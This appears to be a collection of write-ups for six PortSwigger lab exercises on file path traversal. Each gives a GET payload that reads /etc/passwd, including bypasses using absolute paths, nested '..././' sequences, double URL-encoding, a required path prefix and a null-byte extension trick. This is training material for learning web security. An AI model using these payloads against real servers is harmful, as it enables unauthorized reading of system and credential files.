01 File path traversal, simple case
===================================

This lab contains a file path traversal vulnerability in the display of product
images.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/web-security/file-path-traversal

![img](media/139c9ce01b776b7f3a3fb141a9343df6.png)

To retrieve an image the application uses a GET request with the parameter
filename:

![img](media/0e22a24fd14be32a322e7c508df38d3f.png)

To retrieve /etc/passwd:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=../../../etc/passwd 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/034152c8c3612bc1484e845075e707c9.png)

02 File path traversal, traversal sequences blocked with absolute path bypass
=============================================================================

This lab contains a file path traversal vulnerability in the display of product
images.

The application blocks traversal sequences but treats the supplied filename as
being relative to a default working directory.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/web-security/file-path-traversal

![img](media/a63e483ea5fa3ff00f7180a843f12afc.png)

To retrieve an image the application uses a GET request with the parameter
filename:

![img](media/d466cd33a6727e27dc8e96b840650585.png)

To retrieve /etc/passwd:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=/etc/passwd 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/76404ba656f250a26c74251d8c17fba6.png)

03 - File path traversal, traversal sequences stripped non-recursively
======================================================================

This lab contains a file path traversal vulnerability in the display of product
images.

The application strips path traversal sequences from the user-supplied filename
before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/kb/issues/00100300_file-path-traversal

-   https://portswigger.net/web-security/file-path-traversal

Generated link:
https://0a2a0030049b8f43822a9e64007d00ba.web-security-academy.net/

When accessing Home or a post we have GET requests like this one:

![img](media/e016b17a46336c966f2c9f7b9b9e9e0c.png)

![img](media/5f09778f180d5e78bffecfdfd0670cc9.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=..././..././..././..././..././etc/passwd HTTP/2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/bc4fa6c7417a7237cba40a7e8332326f.png)

04 File path traversal, traversal sequences stripped with superfluous URL-decode
================================================================================

This lab contains a file path traversal vulnerability in the display of product
images.

The application blocks input containing path traversal sequences. It then
performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/web-security/file-path-traversal

![img](media/fdbd5d63445692f871f7fb41b1ed761b.png)

To retrieve an image the application uses a GET request with the parameter
filename:

![img](media/d5eb3f6fc68465fa443b33106ef5b31f.png)

To retrieve /etc/passwd we need to use double URL encode the characters:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/b6afd583b7f280a9e95658fcd5d30c1c.png)

05 File path traversal, validation of start of path
===================================================

This lab contains a file path traversal vulnerability in the display of product
images.

The application transmits the full file path via a request parameter, and
validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/web-security/file-path-traversal

![img](media/4f972850928c3ad8517867c1f973ef53.png)

To retrieve an image the application uses a GET request with the parameter
filename and the full path:

![img](media/a29b0d5cc8689101a10a54e5d12437d6.png)

To retrieve /etc/passwd we need the path to start with “/var/www/images/”:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=/var/www/images/../../../etc/passwd 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f215b9e860b3ce56a6c1450c6bfd950f.png)

06 File path traversal, validation of file extension with null byte bypass
==========================================================================

This lab contains a file path traversal vulnerability in the display of product
images.

The application validates that the supplied filename ends with the expected file
extension.

To solve the lab, retrieve the contents of the /etc/passwd file.

References:

-   https://portswigger.net/web-security/file-path-traversal

![img](media/5d677ac6ace62d023da27d5e05939149.png)

To retrieve an image the application uses a GET request with the parameter
filename:

![img](media/85b00c6e98b89b215f693f0b6d5bcdbb.png)

To retrieve /etc/passwd we need to use the null byte:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /image?filename=../../../etc/passwd%00.png
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/ad61e0bd38b3b706cb8576cd9779233a.png)
